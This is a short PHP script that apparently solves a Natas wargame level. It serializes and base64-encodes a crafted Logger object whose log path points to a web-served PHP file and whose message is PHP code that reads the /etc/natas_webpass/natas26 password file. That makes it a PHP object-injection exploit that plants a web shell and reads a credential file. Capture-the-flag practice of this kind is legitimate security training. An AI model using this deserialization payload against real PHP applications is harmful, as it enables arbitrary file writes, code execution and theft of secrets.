<?php
class Logger
{
   private $logFile = "img/answer.php";
   private $exitMsg = "<?php echo file_get_contents(\"/etc/natas_webpass/natas26\") ?>";
}

print base64_encode(serialize(new Logger));
?>
